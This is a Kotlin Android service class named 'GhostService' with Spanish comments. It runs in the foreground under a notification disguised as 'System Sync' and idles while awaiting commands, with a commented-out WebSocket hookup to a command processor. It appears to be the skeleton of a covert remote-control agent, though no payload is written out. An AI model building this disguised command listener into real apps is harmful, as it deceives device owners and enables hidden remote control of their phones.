package com.ghost.android.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.UUID

class GhostService : Service() {
    private var serviceJob: Job? = null
    private val TAG = "GhostService"

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Iniciando servicio fantasma...")
        createNotificationChannel()
        startForeground(1, createNotification())
        
        // Inicia el ciclo de escucha de comandos
        serviceJob = CoroutineScope(Dispatchers.IO).launch {
            Log.d(TAG, "Servicio activo. Esperando inyección...")
            // Aquí conectarías con tu WebSocketClient para recibir JSONs
            // y pasarlos a CommandProcessor.processCommand()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        serviceJob?.cancel()
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("ghost_channel", "System Sync", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Sincronización de fondo"
            }
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification() = android.app.Notification.Builder(this, "ghost_channel")
        .setContentTitle("System Sync")
        .setContentText("Running in background")
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .build()
}
